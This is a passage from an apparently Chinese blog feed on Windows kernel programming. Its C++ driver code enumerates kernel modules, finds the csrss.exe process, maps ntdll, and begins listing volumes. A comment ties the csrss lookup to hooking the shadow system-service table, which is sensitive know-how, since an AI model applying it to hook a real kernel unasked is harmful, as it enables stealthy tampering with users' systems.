class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">GetSystemInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PROCESS_IDENTITY     ((HANDLE)0x4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSRSS_IMAGE_NAME             <span class="string">L&quot;csrss.exe&quot;</span>   <span class="comment">//微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook Sssdt必须</span></span></span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ULONG ViewSize = <span class="number">100</span> * <span class="number">1024</span>;<span class="comment">//100K</span></span><br><span class="line">    ULONG NumberOfModules;</span><br><span class="line">    LONG i;</span><br><span class="line">    PCHAR ModuleName = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PRTL_PROCESS_MODULES RtlProcessModules = <span class="literal">NULL</span>;</span><br><span class="line">    PRTL_PROCESS_MODULE_INFORMATION RtlProcessModuleInfo = <span class="literal">NULL</span>;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = <span class="literal">NULL</span>;     <span class="comment">//系统对所有进程的记录结构</span></span><br><span class="line">    LPCSTR v1;</span><br><span class="line">    ANSI_STRING v2;</span><br><span class="line">    UNICODE_STRING v3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress = <span class="built_in">AllocateMemory1</span>(ViewSize);</span><br><span class="line">        <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统所有模块</span></span><br><span class="line">        Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemModuleInformation, (PVOID)VirtualAddress, ViewSize, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH)   <span class="comment">//内存不足</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">            ViewSize *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Status == STATUS_INFO_LENGTH_MISMATCH);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//游历内存</span></span><br><span class="line">    RtlProcessModules = (PRTL_PROCESS_MODULES)VirtualAddress;</span><br><span class="line">    NumberOfModules = (RtlProcessModules-&gt;NumberOfModules);</span><br><span class="line"></span><br><span class="line">    RtlProcessModuleInfo = (PRTL_PROCESS_MODULE_INFORMATION)(RtlProcessModules-&gt;Modules);  <span class="comment">//获取到第一个模块信息</span></span><br><span class="line"></span><br><span class="line">    v1 = <span class="built_in">strrchr</span>(RtlProcessModuleInfo-&gt;FullPathName, <span class="string">&#x27;\\&#x27;</span>);  <span class="comment">//右边第一次出现的字符</span></span><br><span class="line">    <span class="keyword">if</span> (v1)</span><br><span class="line">    &#123;</span><br><span class="line">        v1++;</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>(&amp;v2, v1);  <span class="comment">//char数组转换成Ansi</span></span><br><span class="line">        Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(&amp;v3, &amp;v2, TRUE);   <span class="comment">//Ansi转换成Unicode</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">RtlStringCchCatW</span>(__NtosFilePath, <span class="built_in">sizeof</span>(__NtosFilePath) / <span class="built_in">sizeof</span>(WCHAR), <span class="string">L&quot;\\SystemRoot\\system32\\&quot;</span>);</span><br><span class="line">            <span class="built_in">RtlStringCchCatNW</span>(__NtosFilePath, <span class="built_in">sizeof</span>(__NtosFilePath) / <span class="built_in">sizeof</span>(WCHAR), v3.Buffer, v3.Length / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">            <span class="built_in">RtlFreeUnicodeString</span>(&amp;v3);   <span class="comment">//TRUE</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//v3 struct _UNICODE_STRING &quot;ntkrnlpa.exe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ntoskrnl.exe    Ntdll.dll    Ssdt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取系统第一个模块信息 ntoskrnl.exe</span></span><br><span class="line">    __NtosImageBase = RtlProcessModuleInfo[<span class="number">0</span>].ImageBase;</span><br><span class="line">    __NtosImageSize = RtlProcessModuleInfo[<span class="number">0</span>].ImageSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举系统模块信息</span></span><br><span class="line">    <span class="comment">//win32k.sys / WIN32KFULL.SYS     User32.dll   Sssdt</span></span><br><span class="line">    <span class="keyword">for</span> (i = (LONG)NumberOfModules - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//c:\windows\system\win32k.sys</span></span><br><span class="line">        ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName);</span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(ModuleName, WIN32K_SYS))</span><br><span class="line">        &#123;</span><br><span class="line">            __Win32kImageBase = RtlProcessModuleInfo[i].ImageBase;  <span class="comment">//0x87e5a31d &quot;win32k.sys&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__OsVersion == WIN10_VERSION_10240)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_stricmp(ModuleName, <span class="string">&quot;win32kfull.sys&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                __Win32kFullImageBase = RtlProcessModuleInfo[i].ImageBase;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ntdll.dll  </span></span><br><span class="line">    <span class="keyword">for</span> (i = (LONG)NumberOfModules - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断地址是否在Ring3层的范围内</span></span><br><span class="line">        <span class="comment">//0: kd&gt; dd MmSystemRangeStart</span></span><br><span class="line">        <span class="comment">//849a584c  80000000 7fff0000 80741000 000fffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)RtlProcessModuleInfo[i].ImageBase &gt; (ULONG_PTR)MmSystemRangeStart)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(ModuleName, NTDLL_DLL))</span><br><span class="line">        &#123;</span><br><span class="line">            __NtdllImageBase = RtlProcessModuleInfo[i].ImageBase;</span><br><span class="line">            __NtdllImageSize = RtlProcessModuleInfo[i].ImageSize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == __NtdllImageBase)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        __NtdllImageBase = <span class="built_in">MappingModuleInfo</span>(<span class="string">L&quot;\\SystemRoot\\System32\\ntdll.dll&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">///&lt; ntdll</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!__NtosImageBase || !__Win32kImageBase || !__NtdllImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取Csrss进程的方法</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == VirtualAddress)</span><br><span class="line">        &#123;</span><br><span class="line">            VirtualAddress = <span class="built_in">AllocateMemory1</span>(ViewSize);</span><br><span class="line">            <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemProcessInformation, VirtualAddress, ViewSize, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">            ViewSize *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Status == STATUS_INFO_LENGTH_MISMATCH);</span><br><span class="line"></span><br><span class="line">    Status = STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)VirtualAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SystemProcessInfo-&gt;ImageName.Length == <span class="built_in">sizeof</span>(CSRSS_IMAGE_NAME) - <span class="built_in">sizeof</span>(WCHAR))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_wcsnicmp(SystemProcessInfo-&gt;ImageName.Buffer,</span><br><span class="line">                CSRSS_IMAGE_NAME,</span><br><span class="line">                (<span class="built_in">sizeof</span>(CSRSS_IMAGE_NAME) - <span class="built_in">sizeof</span>(WCHAR)) / <span class="built_in">sizeof</span>(WCHAR)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//插入到数据结构中</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">InsertCsrssProcessIdentity</span>(SystemProcessInfo-&gt;UniqueProcessId, SystemProcessInfo-&gt;SessionId))</span><br><span class="line">                &#123;</span><br><span class="line">                    Status = STATUS_SUCCESS;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SystemProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">//下一个信息如果不存在</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (ULONG_PTR)SystemProcessInfo += SystemProcessInfo-&gt;NextEntryOffset;   <span class="comment">//定位到下一条信息上</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用内存映射方法获取ntdll模块信息"><a href="#使用内存映射方法获取ntdll模块信息" class="headerlink" title="使用内存映射方法获取ntdll模块信息"></a>使用内存映射方法获取ntdll模块信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MappingModuleInfo</span><span class="params">(LPCWSTR FilePath, PULONG ImageFileSize, PULONG ImageSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEC_IMAGE                   0x1000000    <span class="comment">//内存粒度对齐  </span></span></span><br><span class="line"></span><br><span class="line">    PVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE SectionHandle = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING FilePathU;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    SIZE_T ViewSize = <span class="number">0</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//LARGE_INTEGER SectionOffset;</span></span><br><span class="line">    SECTION_IMAGE_INFORMATION SectionImageInfo;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePathU, FilePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//内核句柄    </span></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes, &amp;FilePathU, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过文件路径获取文件句柄</span></span><br><span class="line">    Status = <span class="built_in">ZwOpenFile</span>(&amp;FileHandle,</span><br><span class="line">        SYNCHRONIZE | GENERIC_READ | FILE_EXECUTE,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectAttributes.ObjectName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过文件句柄获取内存映射句柄</span></span><br><span class="line">    Status = <span class="built_in">ZwCreateSection</span>(&amp;SectionHandle,</span><br><span class="line">        SECTION_MAP_READ | SECTION_QUERY | SECTION_MAP_EXECUTE,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        PAGE_READONLY,</span><br><span class="line">        SEC_IMAGE,</span><br><span class="line">        FileHandle);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取内存对象中的数据</span></span><br><span class="line">    Status = <span class="built_in">ZwQuerySection</span>(SectionHandle,</span><br><span class="line">        SectionImageInformation,</span><br><span class="line">        &amp;SectionImageInfo,</span><br><span class="line">        <span class="built_in">sizeof</span>(SectionImageInfo),</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ImageFileSize) &#123;</span><br><span class="line">        *ImageFileSize = SectionImageInfo.ImageFileSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过Section句柄获取虚拟地址</span></span><br><span class="line">    Status = <span class="built_in">ZwMapViewOfSection</span>(</span><br><span class="line">        SectionHandle,</span><br><span class="line">        <span class="built_in">NtCurrentProcess</span>(),</span><br><span class="line">        &amp;ImageBase,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;ViewSize,</span><br><span class="line">        ViewShare,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        PAGE_READONLY);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ImageSize) &#123;</span><br><span class="line">        *ImageSize = ViewSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FileHandle) &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(FileHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != SectionHandle) &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(SectionHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;获取系统信息&quot;&gt;&lt;a href=&quot;#获取系统信息&quot; class=&quot;headerlink&quot; title=&quot;获取系统信息&quot;&gt;&lt;/a&gt;获取系统信息&lt;/h1&gt;&lt;h2 id=&quot;DriverEntry&quot;&gt;&lt;a href=&quot;#DriverEntry&quot; class=&quot;header</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>获取卷信息</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E5%8D%B7%E4%BF%A1%E6%81%AF/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E5%8D%B7%E4%BF%A1%E6%81%AF/</id>
    <published>2024-03-09T12:34:39.000Z</published>
    <updated>2024-03-09T12:34:55.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取卷信息"><a href="#获取卷信息" class="headerlink" title="获取卷信息"></a>获取卷信息</h1><p>使用内核链表和快速互斥体。</p><p>快速互斥体不支持递归获取，也就是不允许自己线程重复获取。</p><p>一般互斥体只其他线程，自己线程可以多次取得。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FAST_MUTEX __VolumeInfoLock;</span><br><span class="line">LIST_ENTRY __VolumeInfoList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExInitializeFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;__VolumeInfoList);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnumVolumeInfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举卷信息"><a href="#枚举卷信息" class="headerlink" title="枚举卷信息"></a>枚举卷信息</h2><p>从A盘开始，将路径转为UnicodeString，再转到OA，调用ZwCreateFile获取卷句柄，调用ZwQueryObject获取对象信息，插入数据结构中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnumVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR DosDevice[] = <span class="string">L&quot;\\DosDevices\\X:&quot;</span>;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line">    WCHAR i;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">    HANDLE VolumeHandle;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line">    OBJECT_NAME_INFORMATION* ObjectNameInfo = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG ObjectNameInfoLength = BUFFER_SIZE_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeVolumeInfo</span>();</span><br><span class="line"></span><br><span class="line">    ObjectNameInfo = (OBJECT_NAME_INFORMATION*)<span class="built_in">AllocateBufferFromLookAsideList</span>();  <span class="comment">// 动态申请内存</span></span><br><span class="line">    <span class="keyword">if</span> (ObjectNameInfo == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从A盘开始遍历</span></span><br><span class="line">        DosDevice[<span class="number">12</span>] = <span class="string">L&#x27;A&#x27;</span> + i;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, DosDevice);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes,</span><br><span class="line">            &amp;v1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span 